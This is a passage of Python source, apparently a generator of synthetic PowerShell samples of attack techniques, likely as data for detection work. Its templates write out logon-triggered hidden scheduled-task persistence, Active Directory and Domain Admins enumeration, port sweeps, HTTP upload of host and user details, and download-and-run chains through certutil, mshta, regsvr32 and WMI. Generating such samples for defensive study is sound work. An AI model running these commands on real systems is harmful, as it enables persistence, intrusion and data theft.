        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Scheduled-task persistence installation.",
                ["Registers a per-user logon task that launches a PowerShell",
                 "PowerShell file from the roaming profile."],
            )
        entries = [
            ("string", "TaskName", task_q),
            ("string", "ScriptPath", script_expr),
        ]
        if p["param"]:
            entries.append(("int", "StartDelayMinutes", str(trigger_minutes)))
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Stop"')
        lines.append("")
        body = [
            "$TaskAction = New-ScheduledTaskAction" +
            ' -Execute "powershell.exe" -Argument ' + '"' + ps_cmd + '"',
            "$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn",
            "$TaskSettings = New-ScheduledTaskSettingsSet" +
            " -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries",
            "Register-ScheduledTask -TaskName $TaskName -Action $TaskAction" +
            " -Trigger $TaskTrigger -Settings $TaskSettings -Force" + ea,
            "$TaskState = Get-ScheduledTask -TaskName $TaskName" + ea,
            'Write-Verbose ("Task state: " + $TaskState.State)',
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "Scheduled-task installation failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: action builder, registration helper and verification helper
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Scheduled-task persistence workflow.",
            ["Builds a hidden PowerShell action, registers it against a logon",
             "trigger with conservative settings, then verifies the task and",
             "records its state in a small report."],
            notes=["The task runs in the current user context."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", "TaskName", task_q),
        ("string", "ScriptPath", script_expr),
        ("string", log_v, _log_expr(rng)),
        ("int", "StartDelayMinutes", str(trigger_minutes)),
    ]
    lines += _config(rng, entries, p["param"], mandatory=rng.random() < 0.3)
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append("")
    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v + ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostics") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "New-StageTaskAction",
        [("string", "TargetScript", _q(rng, ""))],
        [
            'Write-Verbose ("Building action for " + $TargetScript)',
            '$Argument = "-NoP -WindowStyle Hidden -File `"" + $TargetScript + "`""',
            '$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Argument',
            "return $Action",
        ],
        comment=_section(rng, "Action builder") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Register-StagePersistence",
        [("string", "TaskName", _q(rng, "")),
         ("string", "ScriptPath", _q(rng, ""))],
        [
            "$Action = New-StageTaskAction -TargetScript $ScriptPath",
            "$Trigger = New-ScheduledTaskTrigger -AtLogOn",
            "$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries" +
            " -DontStopIfGoingOnBatteries",
            "Register-ScheduledTask -TaskName $TaskName -Action $Action" +
            " -Trigger $Trigger -Settings $Settings -Force" + ea,
            "return (Get-ScheduledTask -TaskName $TaskName" + ea + ")",
        ],
        comment=_section(rng, "Registration") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-StageLog -Message "Starting scheduled-task stage"',
        "$TaskObject = Register-StagePersistence -TaskName $TaskName" +
        " -ScriptPath $ScriptPath",
        'Write-StageLog -Message ("Task state: " + $TaskObject.State)',
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Scheduled-task workflow failed")
    lines += main
    lines.append("")
    lines += [
        "$TaskReport = [ordered]@{",
        '    Stage = "scheduled-task"',
        "    TaskName = $TaskName",
        "    ScriptPath = $ScriptPath",
        "    DelayMinutes = $StartDelayMinutes",
        "}",
        "$TaskReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


# === BUILDERS_3 ===


def build_domain_recon(rng: random.Random) -> str:
    """AD/domain inventory samples (read-only commands, temp output)."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    domain = _pick(rng, ("contoso.com", "adatum.com", "internal.corp",
                         "example.com"))
    domain_q = _q(rng, domain)
    log_expr, log_raw = _artifact(rng, "log")
    csv_expr, csv_raw = _artifact(rng, "csv")
    json_expr, json_raw = _artifact(rng, "json")
    result_v = _pick(rng, RESULT_VARS)
    limit = rng.randint(10, 40)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        if p["param"]:
            entries = [("string", "DomainName", domain_q),
                       ("string", "ReportPath", json_expr)]
            core = [
                "Get-ADDomain -Identity $DomainName | Select-Object Name,DomainMode,PDCEmulator" +
                " | Out-File -FilePath $ReportPath -Append" + ea,
                'net group "Domain Admins" /domain | Out-File -FilePath $ReportPath -Append' + ea,
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        variant = rng.randrange(6)
        if variant == 0:
            statements.append("Get-ADDomain -Identity " + domain_q +
                              " | Select-Object Name,DomainMode,PDCEmulator | Out-File " +
                              log_expr + " -Append" + ea)
        elif variant == 1:
            statements.append('net group "Domain Admins" /domain | Out-File ' +
                              log_expr + " -Append" + ea)
        elif variant == 2:
            statements.append("Get-ADUser -Filter * -Properties LastLogonDate" +
                              " | Select-Object -First " + str(limit) +
                              " SamAccountName,LastLogonDate | Export-Csv " +
                              csv_expr + " -NoTypeInformation" + ea)
        elif variant == 3:
            statements.append("nltest /dclist:" + domain + " | Out-File " +
                              log_expr + " -Append" + ea)
        elif variant == 4:
            statements.append("whoami /groups /fo csv | Out-File " + log_expr +
                              " -Append" + ea)
        else:
            statements.append("Get-ADComputer -Filter * -Properties OperatingSystem" +
                              " | Select-Object -First " + str(limit) +
                              " Name,OperatingSystem | Export-Csv " + csv_expr +
                              " -NoTypeInformation" + ea)
        if rng.random() < 0.45:
            statements.append("Import-Module ActiveDirectory" + ea)
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Domain inventory collection helper.",
                ["Queries the current domain for basic domain, user, group",
                 "and computer metadata and writes the result to CSV/JSON."],
            )
        entries = [
            ("string", "DomainName", domain_q),
            ("string", "ReportPath", json_expr),
        ]
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Continue"')
        lines.append("")
        body = [
            "Import-Module ActiveDirectory" + ea,
            'Write-Verbose ("Collecting inventory for " + $DomainName)',
            "$DomainInfo = Get-ADDomain -Identity $DomainName" + ea,
            "$Users = Get-ADUser -Filter * -Properties LastLogonDate" +
            " | Select-Object -First " + str(limit) +
            " SamAccountName,LastLogonDate",
            '$Groups = net group "Domain Admins" /domain',
            "$Computers = Get-ADComputer -Filter * -Properties OperatingSystem" +
            " | Select-Object -First " + str(limit) + " Name,OperatingSystem",
            "$" + result_v + " = [PSCustomObject]@{",
            "    Domain = $DomainInfo.Name",
            "    Forest = $DomainInfo.Forest",
            "    Users = $Users",
            "    Groups = $Groups",
            "    Computers = $Computers",
            "}",
            "$" + result_v + " | ConvertTo-Json -Depth 4 | Out-File -FilePath $ReportPath",
            'Write-Verbose ("Report written to " + $ReportPath)',
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "Domain inventory failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: three helpers and a JSON report
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Domain and privileged-group reconnaissance workflow.",
            ["Collects domain metadata, enumerates a bounded set of users and",
             "computers, captures privileged group membership and exports a",
             "single JSON report for the operator."],
            notes=["Only built-in directory cmdlets are used."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", "DomainName", domain_q),
        ("string", "ReportPath", json_expr),
        ("string", log_v, _log_expr(rng, "recon.log")),
    ]
    lines += _config(rng, entries, p["param"], mandatory=rng.random() < 0.3)
    lines.append('$ErrorActionPreference = "Continue"')
    lines.append("Import-Module ActiveDirectory" + ea)
    lines.append("")
    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v + ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostics") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Get-DomainInventory",
        [("string", "DomainName", _q(rng, ""))],
        [
            '$Domain = Get-ADDomain -Identity $DomainName' + ea,
            "return [PSCustomObject]@{",
            "    Name = $Domain.Name",
            "    Forest = $Domain.Forest",
            "    DomainMode = $Domain.DomainMode",
            "    PDCEmulator = $Domain.PDCEmulator",
            "}",
        ],
        comment=_section(rng, "Domain metadata") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Get-PrivilegedGroup",
        [],
        [
            '$Members = net group "Domain Admins" /domain',
            "if ([string]::IsNullOrWhiteSpace($Members)) {",
            '    Write-Verbose "No group output returned"',
            "}",
            "return $Members",
        ],
        comment=_section(rng, "Privileged group") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Export-ReconReport",
        [("string", "Path", _q(rng, "")),
         ("object", "DomainInfo", "$null"),
         ("object", "GroupInfo", "$null")],
        [
            "$Report = [PSCustomObject]@{",
            "    Domain = $DomainInfo",
            "    PrivilegedGroup = $GroupInfo",
            "    CollectedAt = (Get-Date).ToString(\"o\")",
            "}",
            "$Report | ConvertTo-Json -Depth 4 | Out-File -FilePath $Path",
            "return $Path",
        ],
        comment=_section(rng, "Report export") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-StageLog -Message "Starting domain inventory"',
        "$DomainInfo = Get-DomainInventory -DomainName $DomainName",
        "$GroupInfo = Get-PrivilegedGroup",
        "$" + result_v + " = Export-ReconReport -Path $ReportPath" +
        " -DomainInfo $DomainInfo -GroupInfo $GroupInfo",
        'Write-StageLog -Message ("Report: " + $' + result_v + ")",
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Domain reconnaissance failed")
    lines += main
    lines.append("")
    lines += [
        "$ReconSummary = [ordered]@{",
        '    Stage = "domain-recon"',
        "    Domain = $DomainName",
        "    ReportPath = $ReportPath",
        "}",
        "$ReconSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_network_recon(rng: random.Random) -> str:
    """Test-NetConnection / port-loop reconnaissance samples."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    hosts = [_ip(rng) for _ in range(rng.randint(2, 4))]
    ports = rng.sample(SCAN_PORTS, rng.randint(2, 4))
    host_v = _pick(rng, ("TargetHost", "ComputerName", "TargetAddress",
                         "RemoteHost"))
    port_v = _pick(rng, ("RemotePort", "TargetPort", "ProbePort", "ScanPort"))
    result_v = _pick(rng, RESULT_VARS)
    log_expr, log_raw = _artifact(rng, "log")
    csv_expr, csv_raw = _artifact(rng, "csv")
    timeout = rng.randint(2, 20)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""
    host_array = "@(" + ",".join(_q(rng, h) for h in hosts) + ")"
    port_array = "@(" + ",".join(str(p) for p in ports) + ")"

    if bucket == "short":
        if p["param"]:
            entries = [("string", "TargetHost", _q(rng, hosts[0])),
                       ("int", "RemotePort", str(ports[0]))]
            core = ["Test-NetConnection -ComputerName $TargetHost" +
                    " -Port $RemotePort -InformationLevel Quiet" + ea]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        variant = rng.randrange(4)
        if variant == 0:
            statements.append("$" + host_v + " = " + _q(rng, hosts[0]))
            statements.append("Test-NetConnection -ComputerName $" + host_v +
                              " -Port " + str(ports[0]) +
                              " -InformationLevel Quiet" + ea)
        elif variant == 1:
            statements.append("$Targets = " + host_array)
            statements.append("foreach ($" + host_v + " in $Targets) { foreach ($" +
                              port_v + " in " + port_array +
                              ") { Test-NetConnection -ComputerName $" + host_v +
                              " -Port $" + port_v + " -InformationLevel Quiet } }")
        elif variant == 2:
            statements.append("Test-Connection -ComputerName " +
                              _q(rng, hosts[0]) + " -Count " +
                              str(rng.randint(1, 4)) + " -Quiet" + ea)
        else:
            statements.append("Resolve-DnsName -Name " + _q(rng, domain_choice(rng)) +
                              " -Type A | Select-Object Name,IPAddress | Out-File " +
                              log_expr + " -Append" + ea)
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "TCP reachability sweep.",
                ["Probes a bounded list of hosts and ports, captures one",
                 "result object per probe and exports the sweep as CSV."],
            )
        entries = [
            ("string[]", "TargetHosts", host_array),
            ("int[]", "TargetPorts", port_array),
            ("string", "ReportPath", csv_expr),
        ]
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Continue"')
        lines.append("")
        body = [
            "$" + result_v + " = @()",
            "foreach ($" + host_v + " in $TargetHosts) {",
            "    foreach ($" + port_v + " in $TargetPorts) {",
            "        $Open = Test-NetConnection -ComputerName $" + host_v +
            " -Port $" + port_v + " -InformationLevel Quiet" + ea,
            "        $" + result_v + " += [PSCustomObject]@{",
            "            Host = $" + host_v,
            "            Port = $" + port_v,
            "            Open = $Open",
            "        }",
            "    }",
            "}",
            "$" + result_v + " | Export-Csv -Path $ReportPath -NoTypeInformation",
            'Write-Verbose ("Sweep complete: " + $' + result_v + ".Count + \" probes\")",
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "Network sweep failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: resolver, sweep helper and exporter
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Network reconnaissance and reporting workflow.",
            ["Resolves the target set, runs a bounded TCP sweep, records",
             "latency and reachability, then exports both CSV and JSON",
             "views of the collected results."],
            notes=["Probe timeouts are intentionally short."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string[]", "TargetHosts", host_array),
        ("int[]", "TargetPorts", port_array),
        ("string", "ReportPath", csv_expr),
        ("string", log_v, _log_expr(rng, "recon.log")),
    ]
    lines += _config(rng, entries, p["param"], mandatory=rng.random() < 0.3)
    lines.append('$ErrorActionPreference = "Continue"')
    lines.append("")
    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v + ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostics") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Resolve-TargetHost",
        [("string", "TargetAddress", _q(rng, ""))],
        [
            "if ([string]::IsNullOrWhiteSpace($TargetAddress)) {",
            '    throw "Target address is empty"',
            "}",
            "Write-Verbose (\"Testing \" + $TargetAddress)",
            "return $TargetAddress",
        ],
        comment=_section(rng, "Resolver") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Invoke-PortSweep",
        [("string[]", "Hosts", "@()"),
         ("int[]", "Ports", "@()")],
        [
            "$Results = @()",
            "foreach ($HostName in $Hosts) {",
            "    foreach ($PortNumber in $Ports) {",
            "        $Open = Test-NetConnection -ComputerName $HostName" +
            " -Port $PortNumber -InformationLevel Quiet" + ea,
            "        $Results += [PSCustomObject]@{",
            "            Host = $HostName",
            "            Port = $PortNumber",
            "            Open = $Open",
            "        }",
            "    }",
            "}",
            "return $Results",
        ],
        comment=_section(rng, "Sweep") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-StageLog -Message "Starting network sweep"',
        "$" + result_v + " = Invoke-PortSweep -Hosts $TargetHosts -Ports $TargetPorts",
        "$" + result_v + " | Export-Csv -Path $ReportPath -NoTypeInformation",
        'Write-StageLog -Message ("Probes: " + $' + result_v + ".Count)",
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Network reconnaissance failed")
    lines += main
    lines.append("")
    lines += [
        "$SweepSummary = [ordered]@{",
        '    Stage = "network-recon"',
        "    HostCount = $TargetHosts.Count",
        "    PortCount = $TargetPorts.Count",
        "    ReportPath = $ReportPath",
        "}",
        "$SweepSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def domain_choice(rng: random.Random) -> str:
    return _pick(rng, ("example.com", "example.org", "contoso.com",
                       "adatum.com", "internal.corp"))


def build_http_exfil(rng: random.Random) -> str:
    """Invoke-RestMethod POST samples that ship placeholder host metadata."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    endpoint = _url(rng, "upload")
    endpoint_q = _q(rng, endpoint)
    endpoint_v = _pick(rng, URL_VARS)
    report_expr, report_raw = _artifact(rng, "json")
    result_v = _pick(rng, RESULT_VARS)
    timeout = rng.randint(10, 180)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        if p["param"]:
            entries = [("string", endpoint_v, endpoint_q)]
            core = [
                "$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; "
                "UserName = $env:USERNAME; Domain = $env:USERDOMAIN }",
                "Invoke-RestMethod -Uri $" + endpoint_v +
                " -Method Post -Body ($ProfileData | ConvertTo-Json)" +
                ' -ContentType "application/json"' + ea,
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        variant = rng.randrange(4)
        if variant == 0:
            statements.append(
                "$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; "
                "UserName = $env:USERNAME; Domain = $env:USERDOMAIN; "
                "OSVersion = [Environment]::OSVersion.VersionString }")
            statements.append("Invoke-RestMethod -Uri " + endpoint_q +
                              " -Method Post -Body ($ProfileData | ConvertTo-Json)" +
                              ' -ContentType "application/json"' + ea)
        elif variant == 1:
            statements.append("Invoke-WebRequest -Uri " + endpoint_q +
                              " -Method Post -InFile " + report_expr +
                              ' -ContentType "application/json"' + ea)
        elif variant == 2:
            statements.append("$BodyText = Get-Content -Path " + report_expr +
                              " -Raw" + ea)
            statements.append("Invoke-RestMethod -Uri " + endpoint_q +
                              " -Method Post -Body $BodyText" +
                              ' -ContentType "application/json"' + ea)
        else:
            statements.append("$PayloadJson = [ordered]@{ Host = $env:COMPUTERNAME; "
                              "User = $env:USERNAME; Stage = \"telemetry\" } | "
                              "ConvertTo-Json")
            statements.append("Invoke-RestMethod -Uri " + endpoint_q +
                              " -Method Post -Body $PayloadJson" +
                              ' -ContentType "application/json"' + ea)
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Host telemetry upload helper.",
                ["Collects a small set of host fields, encodes",
                 "them as JSON and posts the document to the configured endpoint."],
            )
        entries = [
            ("string", endpoint_v, endpoint_q),
            ("string", "ReportPath", report_expr),
        ]
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Stop"')
        lines.append("")
        body = [
            'Write-Verbose "Collecting host telemetry"',
            "$" + result_v + " = [ordered]@{",
            "    ComputerName = $env:COMPUTERNAME",
            "    UserName = $env:USERNAME",
            "    Domain = $env:USERDOMAIN",
            "    OSVersion = [Environment]::OSVersion.VersionString",
            "    ProcessCount = (Get-Process).Count",
            "}",
            "$" + result_v + " | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath",
            'Write-Verbose ("Telemetry written to " + $ReportPath)',
            "$Response = Invoke-RestMethod -Uri $" + endpoint_v +
            " -Method Post -Body (Get-Content -Path $ReportPath -Raw)" +
            ' -ContentType "application/json"' + ea,
            'Write-Verbose ("Upload status: " + $Response)',
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "Telemetry upload failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: profile builder, retrying uploader and report
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Telemetry collection and HTTP upload workflow.",
            ["Builds a compact host profile from environment variables and",
             "operating-system metadata, writes it as JSON and uploads it",
             "with a bounded retry loop."],
            notes=["Only host metadata is included."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", endpoint_v, endpoint_q),
        ("string", "ReportPath", report_expr),
        ("string", log_v, _log_expr(rng)),
        ("int", "TimeoutSec", str(timeout)),
    ]
    lines += _config(rng, entries, p["param"], mandatory=rng.random() < 0.3)
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append("")
    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v + ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostics") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Get-SystemProfile",
        [],
        [
            "$Profile = [ordered]@{",
            "    ComputerName = $env:COMPUTERNAME",
            "    UserName = $env:USERNAME",
            "    Domain = $env:USERDOMAIN",
            "    OSVersion = [Environment]::OSVersion.VersionString",
            "    ProcessCount = (Get-Process).Count",
            "}",
            "return $Profile",
        ],
        comment=_section(rng, "Profile") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Send-StageReport",
        [("string", "EndpointUrl", _q(rng, "")),
         ("string", "BodyPath", _q(rng, "")),
         ("int", "RetryCount", "3")],
        [
            "for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {",
            "    try {",
            "        $Body = Get-Content -Path $BodyPath -Raw",
            "        return Invoke-RestMethod -Uri $EndpointUrl -Method Post" +
            ' -Body $Body -ContentType "application/json" -TimeoutSec ' +
            str(timeout),
            "    }",
            "    catch {",
            '        Write-Verbose ("Upload attempt " + $Attempt + " failed")',
            "        Start-Sleep -Seconds 3",
            "    }",
            "}",
            "return $null",
        ],
        comment=_section(rng, "Uploader") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-StageLog -Message "Starting telemetry upload"',
        "$" + result_v + " = Get-SystemProfile",
        "$" + result_v + " | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath",
        "$UploadResult = Send-StageReport -EndpointUrl $" + endpoint_v +
        " -BodyPath $ReportPath -RetryCount 3",
        'Write-StageLog -Message ("Upload result: " + $UploadResult)',
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Telemetry workflow failed")
    lines += main
    lines.append("")
    lines += [
        "$TelemetryReport = [ordered]@{",
        '    Stage = "upload"',
        "    Endpoint = $" + endpoint_v,
        "    ReportPath = $ReportPath",
        "    TimeoutSec = $TimeoutSec",
        "}",
        "$TelemetryReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_wmi_lolbin(rng: random.Random) -> str:
    """WMI process creation / inventory plus a LOLBin download chain."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    url = _url(rng)
    url_q = _q(rng, url)
    payload_expr, payload_raw = _artifact(rng, "payload")
    log_expr, log_raw = _artifact(rng, "log")
    result_v = _pick(rng, RESULT_VARS)
    timeout = rng.randint(5, 90)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        if p["param"]:
            entries = [("string", "EndpointUrl", url_q)]
            core = [
                "certutil.exe -urlcache -split -f $EndpointUrl " + payload_expr,
                'Start-Process -FilePath "calc.exe" -WindowStyle Hidden' + ea,
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        variant = rng.randrange(6)
        if variant == 0:
            statements.append("Invoke-CimMethod -ClassName Win32_Process" +
                              ' -MethodName Create -Arguments @{ CommandLine = "calc.exe" }')
        elif variant == 1:
            statements.append("Get-CimInstance -ClassName Win32_Process" +
                              ' | Where-Object { $_.Name -eq "explorer.exe" }' +
                              " | Select-Object ProcessId,Name,CommandLine | Out-File " +
                              log_expr + " -Append" + ea)
        elif variant == 2:
            statements.append("certutil.exe -urlcache -split -f " + url_q + " " +
                              payload_expr)
            statements.append('Start-Process -FilePath "calc.exe" -WindowStyle Hidden' + ea)
        elif variant == 3:
            statements.append("mshta.exe " + url_q)
        elif variant == 4:
            statements.append("regsvr32.exe /s /u /i:" + url + " scrobj.dll")
        else:
            statements.append('rundll32.exe shell32.dll,ShellExec_RunDLL "calc.exe"')
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "WMI inventory and LOLBin handoff helper.",
                ["Collects a short process inventory, downloads a payload stage",
                 "payload through a signed Windows utility and starts a benign",
                 "execution target."],
            )
        entries = [
            ("string", "EndpointUrl", url_q),
            ("string", "PayloadPath", payload_expr),
            ("int", "TimeoutSec", str(timeout)),
        ]
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Continue"')
        lines.append("")
        body = [
            'Write-Verbose "Collecting process inventory"',
            "Get-CimInstance -ClassName Win32_Process" +
            ' | Where-Object { $_.Name -eq "explorer.exe" }' +
            " | Select-Object ProcessId,Name,CommandLine | Out-File " +
            log_expr + " -Append" + ea,
            "certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath",
            "$" + result_v + " = Invoke-CimMethod -ClassName Win32_Process" +
            ' -MethodName Create -Arguments @{ CommandLine = "calc.exe" }' + ea,
            'Write-Verbose ("Process ID: " + $' + result_v + ".ProcessId)",
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "WMI/LOLBin stage failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: inventory, download chain and WMI creation helpers
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "WMI and signed-binary reconnaissance workflow.",
            ["Collects process and system inventory through CIM, downloads a",
             "payload stage with a signed Windows binary, then creates",
             "a benign process through WMI and records the result."],
            notes=["Process creation uses the WMI provider."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", "EndpointUrl", url_q),
        ("string", "PayloadPath", payload_expr),
        ("string", log_v, _log_expr(rng, "recon.log")),
    ]
    lines += _config(rng, entries, p["param"])
    lines.append('$ErrorActionPreference = "Continue"')
    lines.append("")
    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v + ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostics") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Get-WmiInventory",
        [],
        [
            "$System = Get-CimInstance -ClassName Win32_ComputerSystem",
            "$Processes = Get-CimInstance -ClassName Win32_Process" +
            " | Select-Object -First 15 ProcessId,Name,CommandLine",
            "return [PSCustomObject]@{",
            "    ComputerName = $System.Name",
            "    Domain = $System.Domain",
            "    Processes = $Processes",
            "}",
        ],
        comment=_section(rng, "Inventory") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Invoke-LolbinStage",
        [("string", "DownloadUrl", _q(rng, "")),
         ("string", "DestinationPath", _q(rng, ""))],
        [
            'Write-Verbose ("Downloading stage with certutil")',
            "certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath",
            "if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {",
            '    Write-Verbose "Staged payload present"',
            "}",
            "return (Test-Path -Path $DestinationPath)",
        ],
        comment=_section(rng, "LOLBin chain") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-StageLog -Message "Starting WMI/LOLBin stage"',
        "$" + result_v + " = Get-WmiInventory",
        'Write-StageLog -Message ("Host: " + $' + result_v + ".ComputerName)",
        "$StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl" +
        " -DestinationPath $PayloadPath",
        "if ($StageDownloaded) {",
        "    $ProcessResult = Invoke-CimMethod -ClassName Win32_Process" +
        ' -MethodName Create -Arguments @{ CommandLine = "calc.exe" }',
        '    Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)',
        "}",
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "WMI/LOLBin workflow failed")
    lines += main
    lines.append("")
    lines += [
        "$WmiReport = [ordered]@{",
        '    Stage = "wmi-lolbin"',
        "    Endpoint = $EndpointUrl",
        "    PayloadPath = $PayloadPath",
        "}",
        "$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
